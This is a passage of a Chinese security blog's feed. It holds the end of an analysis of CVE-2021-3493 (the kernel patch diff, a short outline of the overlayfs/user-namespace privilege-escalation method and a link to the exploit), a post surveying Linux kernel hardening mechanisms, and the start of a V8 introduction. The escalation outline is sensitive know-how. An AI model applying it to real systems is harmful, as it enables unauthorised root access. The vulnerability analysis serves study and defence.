class="number">59b</span>f3c1674c8b..bacc1111d871b <span class="number">100644</span></span><br><span class="line">--- a/security/commoncap.c</span><br><span class="line">+++ b/security/commoncap.c</span><br><span class="line">@@ <span class="number">-473</span>,<span class="number">7</span> +<span class="number">473</span>,<span class="number">7</span> @@ <span class="keyword">static</span> <span class="keyword">bool</span> validheader(<span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">const</span> struct vfs_cap_data *cap)</span><br><span class="line">  *</span><br><span class="line">  * If all is ok, we <span class="keyword">return</span> the <span class="keyword">new</span> <span class="built_in">size</span>, on error <span class="keyword">return</span> &lt; <span class="number">0.</span></span><br><span class="line">  */</span><br><span class="line">-<span class="keyword">int</span> cap_convert_nscap(struct dentry *dentry, <span class="keyword">void</span> **ivalue, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span><br><span class="line">+<span class="keyword">int</span> cap_convert_nscap(struct dentry *dentry, <span class="keyword">const</span> <span class="keyword">void</span> **ivalue, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span><br><span class="line"> &#123;</span><br><span class="line"> struct vfs_ns_cap_data *nscap;</span><br><span class="line"> <span class="keyword">uid_t</span> nsrootid;</span><br><span class="line">@@ <span class="number">-516</span>,<span class="number">7</span> +<span class="number">516</span>,<span class="number">6</span> @@ <span class="keyword">int</span> cap_convert_nscap(struct dentry *dentry, <span class="keyword">void</span> **ivalue, <span class="keyword">size_t</span> <span class="built_in">size</span>)</span><br><span class="line"> nscap-&gt;magic_etc = cpu_to_le32(nsmagic);</span><br><span class="line"> <span class="built_in">memcpy</span>(&amp;nscap-&gt;data, &amp;cap-&gt;data, <span class="keyword">sizeof</span>(__le32) * <span class="number">2</span> * VFS_CAP_U32);</span><br><span class="line"> </span><br><span class="line">-kvfree(*ivalue);</span><br><span class="line"> *ivalue = nscap;</span><br><span class="line"> <span class="keyword">return</span> newsize;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><h2 id="漏洞利用思路"><a href="#漏洞利用思路" class="headerlink" title="漏洞利用思路"></a>漏洞利用思路</h2><p>总结下<a href="https://github.com/briskets/CVE-2021-349" target="_blank" rel="noopener">exp</a>的利用思路为如下几点：</p><p>修改user namespaces，使其在另一命名空间下具有root权限，从而可以挂载overlay。</p><p>利用overlay拷贝出exp文件，并且因为当前命名空间下为超级权限，可以直接设置capability，从而赋予权限。</p><p>运行exp，提权成功。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://mp.weixin.qq.com/s/msluuYxYSwXhnvTtsS2DnQ" target="_blank" rel="noopener">CVE-2021-3493 Linux kernel提权漏洞复现</a></p><p><a href="https://blog.csdn.net/qq_15770331/article/details/96699386" target="_blank" rel="noopener">深入理解overlayfs（一）：初识</a></p><p><a href="https://blog.csdn.net/ty_laurel/article/details/51262717" target="_blank" rel="noopener">namespaces之 User Namespace机制</a></p><p><a href="https://www.sohu.com/a/115918501_467784" target="_blank" rel="noopener">Linux自主访问控制机制模块详细分析之文件系统的扩展属性</a></p><p><a href="https://www.it610.com/article/1304341051846201344.htm" target="_blank" rel="noopener">linux 中文件系统的扩展属性</a></p><p><a href="https://mp.weixin.qq.com/s/hG-0jae9fQpbDkH3YMSLdw" target="_blank" rel="noopener">Ubuntu内核OverlayFS权限逃逸漏洞分析（CVE-2021-3493）</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2021-3493漏洞分析&quot;&gt;&lt;a href=&quot;#CVE-2021-3493漏洞分析&quot; class=&quot;headerlink&quot; title=&quot;CVE-2021-3493漏洞分析&quot;&gt;&lt;/a&gt;CVE-2021-3493漏洞分析&lt;/h1&gt;&lt;h2 id=&quot;漏洞描述&quot;
      
    
    </summary>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/categories/CVE/"/>
    
    
      <category term="CVE" scheme="https://nuoye-blog.github.io/tags/CVE/"/>
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>linux内核安全缓解机制</title>
    <link href="https://nuoye-blog.github.io/2021/04/11/9d1fafcf/"/>
    <id>https://nuoye-blog.github.io/2021/04/11/9d1fafcf/</id>
    <published>2021-04-11T07:10:00.000Z</published>
    <updated>2021-04-11T07:13:23.601Z</updated>
    
    <content type="html"><![CDATA[<h1 id="linux内核安全缓解机制"><a href="#linux内核安全缓解机制" class="headerlink" title="linux内核安全缓解机制"></a>linux内核安全缓解机制</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>面试的时候被问到linux内核保护模式，居然一时语塞，所以就试着去了解了下，主要借鉴<a href="https://blog.csdn.net/panhewu9919/article/details/106995393?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control" target="_blank" rel="noopener">参考文章1</a>。</p><h2 id="LSM"><a href="#LSM" class="headerlink" title="LSM"></a>LSM</h2><p>LSM全称Linux Security Modules，Linux安全模块，是一个在内核模块的基础上提出的轻量级的安全访问控制框架。</p><p>LSM框架只是提供一个支持安全模块的接口，本身不能增强系统安全性。通过LSM框架，安全模块层的安全模块可以非常自由地在内核里加载和卸载，不需要对内核进行重新编译。</p><h3 id="框架结构"><a href="#框架结构" class="headerlink" title="框架结构"></a>框架结构</h3><ul><li>在内核数据中加入安全域（存放安全属性）</li><li>在内核代码中不同关键点插入对hook函数的调用</li></ul><h3 id="访问控制模式"><a href="#访问控制模式" class="headerlink" title="访问控制模式"></a>访问控制模式</h3><ul><li>DAC：Discretionary Access Control，自主访问控制，是指对某个客体具有拥有权（或控制权）的主体，能够将对该客体的一种或多种访问权自主地授予其他主体，并在随后的任何时刻将这些权限回收。</li><li>MAC：Mandatory access control，强制访问控制，其目标是限制主体或发起者访问或对对象/目标执行某种操作的能力，主体通常是一个进程或线程，对象可能是文件、目录、TCP/UDP端口、共享内存段、I/O设备等。每当主体尝试访问对象时，都会由操作系统内核强制执行授权规则，检查安全属性并决定是否可进行访问；同样，任何主体对任何对象的任何操作都将根据一组授权规则进行测试，决定操作是否被允许。该模式下用户不能覆盖或修改策略，策略由安全管理员集中控制。</li></ul><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>区别与linux kernel module，至少有两个地方不同：</p><ul><li>必须由BootLoader启动内核时启动，不能再内核加载完后启动。</li><li>不能同时启动两个LSM的实现</li></ul><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><h4 id="SELinux"><a href="#SELinux" class="headerlink" title="SELinux"></a>SELinux</h4><p>由美国NSA维护，基于强制访问控制MAC实现，基于角色的访问控制——进程只能访问那些存在他的任务中所需要的文件，简化用户的权限管理，减少了系统开销。</p><h6 id="SELinux优点"><a href="#SELinux优点" class="headerlink" title="SELinux优点"></a>SELinux优点</h6><p>通过对用户、进程权限的最小化，即使受到攻击，进程或用户权限被夺去，也不会对整个系统造成重大影响。</p><ul><li>对访问的控制彻底化（MAC）</li><li>对子进程只赋予最小的权限</li><li>防止权限升级</li><li>对用户只赋予最小的权限</li></ul><h4 id="AppArmor"><a href="#AppArmor" class="headerlink" title="AppArmor"></a>AppArmor</h4><p>由OpenSuSE/Ubuntu维护，基于MAC实现，是SELinux的一个备选，SELinux是对文件加标签，AppArmor是对文件路径，配置起来更简单，且对系统的修改少。</p><h4 id="PaX-Grsecuriyty"><a href="#PaX-Grsecuriyty" class="headerlink" title="PaX/Grsecuriyty"></a>PaX/Grsecuriyty</h4><p>开始由PaX维护，后由Grsecuriyty团队维护，采用patch形式加入到linux。</p><h2 id="linux防御机制"><a href="#linux防御机制" class="headerlink" title="linux防御机制"></a>linux防御机制</h2><p>linux防御机制（摘自参考文章1）：<img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="https://cdn.jsdelivr.net/gh/nuoye-blog/pic/img/20210411150821.jpg" alt="linux防御机制"></p><p>注：</p><p>​    绿——加入到内核主流的防御机制</p><p>​    蓝——Out-of-tree denfense</p><p>​    灰——商用防御</p><p>​    青——护网防御</p><p>​    白——通用防御机制</p><p>​    紫——漏洞检测</p><p>​    粉——漏洞</p><p>​    黄——漏洞利用技术</p><h3 id="防御机制"><a href="#防御机制" class="headerlink" title="防御机制"></a>防御机制</h3><h4 id="RANDSTRUCT"><a href="#RANDSTRUCT" class="headerlink" title="RANDSTRUCT"></a>RANDSTRUCT</h4><p>在编译时通过传入seed随机化重新排列域，缓解缓冲区溢出。（菜鸡翻译，这里是原文，下同：The <code>randstruct</code> plugin randomly rearranges fields at compile time given a randomization seed. When potential attackers do not know the layout of a structure, it becomes much harder for them to overwrite specific fields in those structures. ）</p><h4 id="RANDOMIZE-BASE-MEMORY"><a href="#RANDOMIZE-BASE-MEMORY" class="headerlink" title="RANDOMIZE_{BASE,MEMORY}"></a>RANDOMIZE_{BASE,MEMORY}</h4><p>kaslr（内核地址空间随机化）的开关，但还需要cmdline的支持。</p><p>RANDOMIZE_BASE：每次启动都将kernel image映射在不同虚拟内存地址上。</p><p>RANDOMIZE_MEMORY：开启后将随机化线性映射区域基址、vmalloc区域基址、vmemmap区域基址。</p><h4 id="LATENT-ENTROPY"><a href="#LATENT-ENTROPY" class="headerlink" title="LATENT_ENTROPY"></a>LATENT_ENTROPY</h4><p>将随机数写入latent_entropy这一全局变量，并加入到内核熵池从而增大内核熵，提高内核中密钥的变化。（This plugin mixes random values into the latent_entropy global variable in functions marked by the __latent_entropy attribute. The value of this global variable is added to the kernel entropy pool to increase the entropy.）</p><h4 id="ro-after-init"><a href="#ro-after-init" class="headerlink" title="_ro_after_init"></a>_ro_after_init</h4><p>函数指针和敏感变量必须不可写，对于那些在init时初始化的变量可标记为<code>__ro_after_init</code>属性。</p><h4 id="REFCOUNT-FULL"><a href="#REFCOUNT-FULL" class="headerlink" title="REFCOUNT_FULL"></a>REFCOUNT_FULL</h4><p>通过复制现有的原子refcount实现对refcount_t的溢出保护，通过添加一条指令来检测是否为负数，例如超过INT_MAX或小于0，但检测到时，会将其设置为INT_MAX/2。（This is done by duplicating the existing atomic_t refcount implementation but with normally a single instruction added to detect if the refcount has gone negative (e.g. wrapped past INT_MAX or below zero). When detected, the handler saturates the refcount_t to INT_MIN / 2. With this overflow protection, the erroneous reference release that would follow a wrap back to zero is blocked from happening, avoiding the class of refcount-overflow use-after-free vulnerabilities entirely.）</p><h4 id="TIF-FSCHECK-flag"><a href="#TIF-FSCHECK-flag" class="headerlink" title="TIF_FSCHECK flag"></a>TIF_FSCHECK flag</h4><p>通过添加一个机制检查返回用户态时的地址，任何尝试设置fs寄存器的线程都会被设置TIF_FSCHECK这一标志，并终止。（Check address limit on user-mode return, added a mechanism to check the addr_limit value before returning to userspace. Any call to set_fs() sets a thread flag, TIF_FSCHECK, and if we see that on the return to userspace we go out of line to check that the addr_limit value is not elevated.）</p><h4 id="bpf-jit-harden"><a href="#bpf-jit-harden" class="headerlink" title="bpf_jit_harden"></a>bpf_jit_harden</h4><p>能够使BPF即时编译器更加强壮，被eBPF JIT后端支持，能缓解JIT被堆喷，但启用后会牺牲性能。（This enables hardening for the BPF JIT compiler. Supported are eBPF JIT backends. Enabling hardening trades off performance, but can mitigate JIT spraying.）</p><h4 id="MODULE-SIG"><a href="#MODULE-SIG" class="headerlink" title="MODULE_SIG*"></a>MODULE_SIG*</h4><p>加载模块时会检查签名的有效性，如果签名不存在或者签名内容不一致，会强制退出模块的加载。（Check modules for valid signatures upon load: the signature is simply appended to the module. ）</p><h4 id="SECURITY-LOADPIN"><a href="#SECURITY-LOADPIN" class="headerlink" title="SECURITY_LOADPIN"></a>SECURITY_LOADPIN</h4><p>通过验证加载的模块、读取的防火墙机制、加载的安全策略等是否来自信任源，若来源不信任则不予加载。（That is the policy that LoadPin was created to implement. It takes advantage of the relatively new kernel file-loading mechanism to intercept all attempts to load a file into the kernel; these include loading kernel modules, reading firmware, loading a security policy, or loading an image for <code>kexec()</code>.）</p><h4 id="LDISC-AUTOLOAD"><a href="#LDISC-AUTOLOAD" class="headerlink" title="LDISC_AUTOLOAD"></a>LDISC_AUTOLOAD</h4><p>设置为Y时可以避免用户采用不同的、古老的行规程（line discipline，应该是这么翻译的）（Historically the kernel has always automatically loaded any line discipline that is in a kernel module when a user asks for it to be loaded with the TIOCSETD ioctl, or through other means. This is not always the best thing to do on systems where you know you will not be using some of the more “ancient” line disciplines, so prevent the kernel from doing this unless the request is coming from a process with the CAP_SYS_MODULE permissions.</p><p>Say ‘Y’ here if you trust your userspace users to do the right thing, or if you have only provided the line disciplines that you know you will be using, or if you wish to continue to use the traditional method of on-demand loading of these modules by any user.）</p><h4 id="STRICT-KERNEL-MODULE-RWX"><a href="#STRICT-KERNEL-MODULE-RWX" class="headerlink" title="STRICT_{KERNEL,MODULE}_RWX"></a><code>STRICT_{KERNEL,MODULE}_RWX</code></h4><p>与用户态NX保护模式类似，将text段、rodata段设置为只读，其他非text段设置为不可执行。（If this is set, kernel text and rodata memory will be made read-only, and non-text memory will be made non-executable. This provides protection against certain security exploits (e.g. executing the heap or modifying text)）</p><h4 id="DEBUG-WX"><a href="#DEBUG-WX" class="headerlink" title="DEBUG_WX"></a>DEBUG_WX</h4><p>若在boot中找到可写、执行段则发出警告。（Generate a warning if any W+X mappings are found at boot.）</p><h4 id="ARM-RODATA-FULL-DEFAULT-ENABLED"><a href="#ARM-RODATA-FULL-DEFAULT-ENABLED" class="headerlink" title="ARM:RODATA_FULL_DEFAULT_ENABLED"></a>ARM:RODATA_FULL_DEFAULT_ENABLED</h4><p>将叶子页表设置为只读，当需要修改时再通过创建一个临时的交替页表进行更新（It’s fairly rare that linear mappings need to be updated, so to improve security we can map the leaf page table entries as read-only, this makes it harder for an attacker to modify the permissions of the linear mappings, while the overhead is low because the linear mappings don’t need to be changed frequently. When they do need to be updated we can use fixmaps to create a temporary alternative mapping to do the update.）</p><h4 id="smep-PXN"><a href="#smep-PXN" class="headerlink" title="smep/PXN"></a>smep/PXN</h4><p>x86中叫smep，arm中叫PXN。禁止内核CPU访问用户空间的数据。</p><h4 id="smap-PAN"><a href="#smap-PAN" class="headerlink" title="smap/PAN"></a>smap/PAN</h4><p>x86中叫smap，arm中叫PAN。禁止内核CPU执行用户空间的代码。</p><h4 id="DEFAULT-MMAP-MIN-ADDR"><a href="#DEFAULT-MMAP-MIN-ADDR" class="headerlink" title="DEFAULT_MMAP_MIN_ADDR"></a>DEFAULT_MMAP_MIN_ADDR</h4><p>设置最小可申请的地址空间，避免空指针误用。（<code>mmap_min_addr</code> is a kernel tunable that specifies the minimum virtual address that a process is allowed to mmap. ）</p><h4 id="pti-kpti"><a href="#pti-kpti" class="headerlink" title="pti/kpti"></a>pti/kpti</h4><p>内核页表隔离，将用户态和内核态的地址空间放在不同页表中。（split the page tables, which are currently shared between user and kernel space, into two sets of tables, one for each side.）</p><h4 id="X86-MICROCODE"><a href="#X86-MICROCODE" class="headerlink" title="X86:MICROCODE"></a>X86:MICROCODE</h4><p>将指令解码为microcode/Micro-Ops，这样如果出现CPU硬件错误，通过修改microcode即可。</p><h4 id="X86-RETPOLINE"><a href="#X86-RETPOLINE" class="headerlink" title="X86:RETPOLINE"></a>X86:RETPOLINE</h4><p>retpoline是google开发的用于针对Spectre变种2漏洞缓解利用的技术。每次CPU在即将执行简接跳转指令时，会去询问间接分支预测（indirect branch predictor），然后投机选择一个最优可能执行的路径；而retpoline则绕过了indirect branch predictor。retpoline包括了return和trampoline，也就是在间接跳转的时候用return指令添加了一个“蹦床”，主要是使用ret指令来实现地址跳转。（As far as I can piece this together from the limited information at the moment, a retpoline is a return trampoline that uses an infinite loop that is never executed to prevent the CPU from speculating on the target of an indirect jump.）</p><h4 id="ARM-HARDEN-BRANCH-PREDICTOR"><a href="#ARM-HARDEN-BRANCH-PREDICTOR" class="headerlink" title="ARM:HARDEN_BRANCH_PREDICTOR"></a>ARM:HARDEN_BRANCH_PREDICTOR</h4><p>加强分支预测的，同样是针对Spectre漏洞的缓解技术。（This config option will take CPU-specific actions to harden the branch predictor against aliasing attacks and may rely on specific instruction sequences or control bits being set by the system firmware.）</p><h4 id="spec-store-bypass-disable-ssbd"><a href="#spec-store-bypass-disable-ssbd" class="headerlink" title="spec_store_bypass_disable/ssbd"></a>spec_store_bypass_disable/ssbd</h4><p>处理器与内存之间维护一个高速缓存，在通常情况下，现代处理器采用Speculative Store Bypass的优化方式提升对高速缓存的访问，但此方法会泄漏投机执行过程中相关的旁路信息，关闭该选项即可全局关闭Speculative Store Bypass优化，也可以通过调用prctl()使特定线程关闭该优化。在X86下如果要更新microcode，需要开启此选项。（Once enabled, mitigation within the guest is identical to bare-metal. User processes can use the prctl() system call and “seccomp” filtering, or system wide mitigation can be turned on with a kernel parameter.）</p><h4 id="mds"><a href="#mds" class="headerlink" title="mds"></a>mds</h4><p>由内核态切换到用户态、或由hypervisor切换到guset时，对store buffer、fill buffer、load port等缓存执行flush操作，该修复需要miscocode更新支持。当处理器支持SMT时，该修复还需要配合关闭SMT，以防止同一个physical core上的另一个logical CPU重新填充这些缓存。</p><h4 id="l1tf"><a href="#l1tf" class="headerlink" title="l1tf"></a>l1tf</h4><p>通过逆序存储non-present的PTE的所有bit，这样使用PFN字段字段逆序后在L1缓存中就会发生cache miss，避免被构造出PFN具有特定值的PTE，从而泄漏出L1缓存中的内容。</p><h4 id="SLAB-FREELIST-RANDOM"><a href="#SLAB-FREELIST-RANDOM" class="headerlink" title="SLAB_FREELIST_RANDOM"></a>SLAB_FREELIST_RANDOM</h4><p>随机化SLAB的freelist，从而缓解堆溢出攻击。（Provides an optional config (CONFIG_SLAB_FREELIST_RANDOM) to randomize the SLAB freelist. The list is randomized during initialization of a new set of pages. The order on different freelist sizes is pre-computed at boot for performance. Each kmem_cache has its own randomized freelist. Before pre-computed lists are available freelists are generated dynamically. This security feature reduces the predictability of the kernel SLAB allocator against heap overflows rendering attacks much less stable.）</p><h4 id="SHUFFLE-PAGE-ALLOCATOR"><a href="#SHUFFLE-PAGE-ALLOCATOR" class="headerlink" title="SHUFFLE_PAGE_ALLOCATOR"></a>SHUFFLE_PAGE_ALLOCATOR</h4><p>页表申请随机化，但会增大没有缓存的平台的工作量。</p><h4 id="slab-nomerge"><a href="#slab-nomerge" class="headerlink" title="slab_nomerge"></a>slab_nomerge</h4><p>即不迁移slab。迁移slab会导致内核堆溢出到其他不同的cache，不迁移则能避免堆溢出影响到其他cache。（For reduced kernel memory fragmentation, slab caches can be merged when they share the same size and other characteristics. This carries a small risk of kernel heap overflows being able to overwrite objects from merged caches, which reduces the difficulty of such heap attacks. By keeping caches unmerged, these kinds of exploits can usually only damage objects in the same cache. To disable merging at runtime, “slab_nomerge” can be passed on the kernel command line.）</p><h4 id="unprivileged-userfaultfd"><a href="#unprivileged-userfaultfd" class="headerlink" title="unprivileged_userfaultfd"></a>unprivileged_userfaultfd</h4><p>允许管理员禁用非特权用户使用缺页中断系统调用。</p><h4 id="DEBUG-LIST-SG-CREDENTIALS-NOTIFIFERS-VIRTUAL"><a href="#DEBUG-LIST-SG-CREDENTIALS-NOTIFIFERS-VIRTUAL" class="headerlink" title="DEBUG_{LIST,SG,CREDENTIALS,NOTIFIFERS,VIRTUAL}"></a>DEBUG_{LIST,SG,CREDENTIALS,NOTIFIFERS,VIRTUAL}</h4><p>DEBUG_LIST:检查链表是否正常</p><p>DEBUG_SG:检查scatter-gather表</p><p>DEBUG_CREDENTIALS:检查指向证书的指针数是否正确，在SELinux下还会检查指向证书的指针</p><p>DEBUG_NOTIFIFERS:检查内核通知链</p><p>DEBUG_VIRTUAL:检查虚拟页表代码</p><h4 id="BUG-ON-DATA-CORRUPTION"><a href="#BUG-ON-DATA-CORRUPTION" class="headerlink" title="BUG_ON_DATA_CORRUPTION"></a>BUG_ON_DATA_CORRUPTION</h4><p>当遇到内核内存数据错误时报错。</p><h4 id="STATIC-USERMODEHELPER"><a href="#STATIC-USERMODEHELPER" class="headerlink" title="STATIC_USERMODEHELPER"></a>STATIC_USERMODEHELPER</h4><p>利用该变量指定的程序来执行从内核中调用用户态函数的操作。</p><h4 id="LOCKDOWN-LSM"><a href="#LOCKDOWN-LSM" class="headerlink" title="LOCKDOWN_LSM"></a>LOCKDOWN_LSM</h4><p>以模块化可选的载入，用于划清用户态和内核态代码界限，防止root用户篡改内核代码。</p><h4 id="ARM-STACKPROTECTOR-PER-TASK"><a href="#ARM-STACKPROTECTOR-PER-TASK" class="headerlink" title="ARM:STACKPROTECTOR_PER_TASK"></a>ARM:STACKPROTECTOR_PER_TASK</h4><p>即canary保护。</p><h4 id="STACKPROTECTOR"><a href="#STACKPROTECTOR" class="headerlink" title="STACKPROTECTOR"></a>STACKPROTECTOR</h4><p>即canary保护。</p><h4 id="FORTIFY-SOURCE"><a href="#FORTIFY-SOURCE" class="headerlink" title="FORTIFY_SOURCE"></a>FORTIFY_SOURCE</h4><p>在编译时检查gets、memcpy等函数操作是否会造成缓冲区溢出。但只能检查出知道变量内存大小的溢出。</p><h4 id="slub-debug"><a href="#slub-debug" class="headerlink" title="slub_debug"></a>slub_debug</h4><p>仅用于检测从slub分配器分配的内存是否溢出，同时也会改变堆的结构。含多个参数取值。</p><h4 id="HARDENED-USERCOPY"><a href="#HARDENED-USERCOPY" class="headerlink" title="HARDENED_USERCOPY"></a>HARDENED_USERCOPY</h4><p>在数据从用户空间拷贝到内核空间时做出检查，包括地址有效性、堆栈检查、代码段检查。</p><h4 id="THREAD-INFO-IN-TASK"><a href="#THREAD-INFO-IN-TASK" class="headerlink" title="THREAD_INFO_IN_TASK"></a>THREAD_INFO_IN_TASK</h4><p>将线程信息从栈上转移到task_struct结构体中。</p><h4 id="VMAP-STACK"><a href="#VMAP-STACK" class="headerlink" title="VMAP_STACK"></a>VMAP_STACK</h4><p>将使用vmalloc申请的地址作为内核栈，并利用vmalloc的guard page增强了栈溢出检测能力，且减少了内存碎片化，但这些内存在物理上可能是不连续的。</p><h4 id="SCHED-STACK-END-CHECK"><a href="#SCHED-STACK-END-CHECK" class="headerlink" title="SCHED_STACK_END_CHECK"></a>SCHED_STACK_END_CHECK</h4><p>当调用schedule()时检测栈结尾是否溢出，当溢出时则发出错误。（This option checks for a stack overrun on calls to schedule(). If the stack end location is found to be over written always panic as the content of the corrupted region can no longer be trusted. This is to ensure no erroneous behaviour occurs which could result in data corruption or a sporadic crash at a later stage once the region is examined. The runtime overhead introduced is minimal.）</p><h4 id="PAX-MEMROY-STACKLEAK"><a href="#PAX-MEMROY-STACKLEAK" class="headerlink" title="PAX_MEMROY_STACKLEAK"></a>PAX_MEMROY_STACKLEAK</h4><p>一方面当进程从内核态进入用户态时，擦除内核栈的信息；另一方面检查进程内核栈是否溢出。</p><h4 id="init-on-free-init-on-alloc"><a href="#init-on-free-init-on-alloc" class="headerlink" title="init_on_free/init_on_alloc"></a>init_on_free/init_on_alloc</h4><p>将申请到或释放的内存初始化，避免泄漏信息。</p><h4 id="PAGE-POISONING"><a href="#PAGE-POISONING" class="headerlink" title="PAGE_POISONING"></a>PAGE_POISONING</h4><p>在free时填充特定字节，申请时检查这些字节是否被修改。</p><h4 id="PAX-MEMORY-SANITIZE"><a href="#PAX-MEMORY-SANITIZE" class="headerlink" title="PAX_MEMORY_SANITIZE"></a>PAX_MEMORY_SANITIZE</h4><p>用于将已经释放的内存进行擦除。</p><h4 id="X86-X86-INTEL-UMIP"><a href="#X86-X86-INTEL-UMIP" class="headerlink" title="X86:X86_INTEL_UMIP"></a>X86:X86_INTEL_UMIP</h4><p>intel用户模式指令防护。在当前特权级别（CPL）大于0时，执行SGDT、SIDT、SMSW和STR指令会导致一般保护异常。</p><h4 id="ARM-HARDEN-EL2-VECTORS"><a href="#ARM-HARDEN-EL2-VECTORS" class="headerlink" title="ARM:HARDEN_EL2_VECTORS"></a>ARM:HARDEN_EL2_VECTORS</h4><p>加强EL2向量映射，防止系统寄存器泄漏信息。</p><h4 id="kptr-restrict"><a href="#kptr-restrict" class="headerlink" title="kptr_restrict"></a>kptr_restrict</h4><p>将/proc/kallsyms文件中函数地址值全部设置为0。</p><h4 id="SECURITY-DMESG-RESTRICT"><a href="#SECURITY-DMESG-RESTRICT" class="headerlink" title="SECURITY_DMESG_RESTRICT"></a>SECURITY_DMESG_RESTRICT</h4><p>限制非管理员用户读取内核日志（syslog，通过dmesg查看）。</p><h4 id="INIT-STACK-ALL"><a href="#INIT-STACK-ALL" class="headerlink" title="INIT_STACK_ALL"></a>INIT_STACK_ALL</h4><p>将未初始化的栈全部填充为0xaa，包括未初始化的变量。</p><h4 id="STRUCTLEAK-BYREF-ALL"><a href="#STRUCTLEAK-BYREF-ALL" class="headerlink" title="STRUCTLEAK_BYREF_ALL"></a>STRUCTLEAK_BYREF_ALL</h4><p>通过引用在内核编译时将变量初始化(gives the kernel complete initialization coverage of all stack variables passed by reference)</p><h4 id="SLAB-FREELIST-HARDENED"><a href="#SLAB-FREELIST-HARDENED" class="headerlink" title="SLAB_FREELIST_HARDENED"></a>SLAB_FREELIST_HARDENED</h4><p>加强freelist，避免常见的freelist攻击。</p><h2 id="linux内核安全更新历史"><a href="#linux内核安全更新历史" class="headerlink" title="linux内核安全更新历史"></a>linux内核安全更新历史</h2><p><a href="https://outflux.net/blog/" target="_blank" rel="noopener">传送门</a></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>翻译了一遍安全模式，也看了好多文章，发现好多之前不懂的，比如miscocode、CWE等等，也算是不少收获吧，不枉花费了这两三天时间。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/panhewu9919/article/details/106995393?utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control&dist_request_id=&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromMachineLearnPai2%7Edefault-6.control" target="_blank" rel="noopener">Linux 安全缓解机制总结</a></p><p><a href="https://www.cnblogs.com/lyeeer/p/11662844.html" target="_blank" rel="noopener">LSM相关知识及理解</a></p><p><a href="http://www.360doc.com/content/21/0207/15/15915859_961159696.shtml" target="_blank" rel="noopener">CPU漏洞详解</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;linux内核安全缓解机制&quot;&gt;&lt;a href=&quot;#linux内核安全缓解机制&quot; class=&quot;headerlink&quot; title=&quot;linux内核安全缓解机制&quot;&gt;&lt;/a&gt;linux内核安全缓解机制&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; cla
      
    
    </summary>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/categories/linux/"/>
    
    
      <category term="linux" scheme="https://nuoye-blog.github.io/tags/linux/"/>
    
      <category term="kernel" scheme="https://nuoye-blog.github.io/tags/kernel/"/>
    
  </entry>
  
  <entry>
    <title>V8入门记录</title>
    <link href="https://nuoye-blog.github.io/2021/04/11/5b38afb8/"/>
    <id>https://nuoye-blog.github.io/2021/04/11/5b38afb8/</id>
    <published>2021-04-10T16:00:00.000Z</published>
    <updated>2021-04-10T15:49:39.959Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V8入门记录"><a href="#V8入门记录" class="headerlink" title="V8入门记录"></a>V8入门记录</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章拖的有点久，从去年11月份就开始搞，后面复习什么的就没继续了，虽然大体知识过了下，但是感觉没有精力去完善，就简单完结下吧。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="V8简介"><a href="#V8简介" class="headerlink" title="V8简介"></a>V8简介</h3><p>V8引擎是一种JavaScript引擎的实现。</p><p>JavaScript引擎是执行JavaScript代码的程序或解释器。javaScript引擎可以实现为标准解释器或即时编译器，它以某种形式将JavaScript编译为字节码。</p><p>V8是被设计用来提高网页浏览器内部JavaScript执行的性能的。V8引入了JIT在运行时把js代码进行转换为机器码，而不产生字节码或任何中间代码，从而提高了性能。相应的代码执行过程大致为：源代码→抽象语法树→JIT→本地代码。</p><p>另外，在V8中当某些代码需要被执行时，才会进行编译。</p><p>V8充分多进程：主进程负责获取代码，编译生成机器码；有专门负责优化的进程；还有一个监控进程负责分析哪些代码执行比较慢，以便Crankshaft做优化；最后还有一个就是GC进程，负责内存垃圾回收。</p><p>V8具体优化方案（这里只列举，详细可查看最下方参考文章）：</p><ol><li>尽可能最大的内联</li><li>隐藏类的优化</li><li>内联缓存</li><li>Compilation to machine code</li><li>垃圾回收机制</li></ol><p>v8项目结构如下：</p><ul><li>V8<ul><li>include    V8接口<ul><li>v8.h    用于包含V8的接口</li><li>v8-debug.h    V8调试相关的接口</li><li>v8-profiler.h    V8信息收集器的接口</li><li>v8-testing.h    V8测试相关的接口</li></ul></li><li>src    V8内部实现<ul><li>arm    ARM后端，抽象语法树转成ARM指令的相关代码</li><li>ia32    IA32后端，抽象语法树转成IA32指令的相关代码</li><li>x64    X64后端，抽象语法树转成X64指令的相关代码</li><li>ast.h/cc    抽象语法树的实现</li><li>d8.h/cc    V8的一个调试程序</li><li>full-codegen.h/cc    从抽象语法树生成本地代码</li><li>heap.h/cc    V8使用的堆实现</li><li>extensions    V8扩展机制</li></ul></li><li>benchmarks    JavaScript性能测试用例</li><li>build    编译V8项目相关脚本</li></ul></li></ul><h3 id="环境搭建"><a href="#环境搭建" class="headerlink" 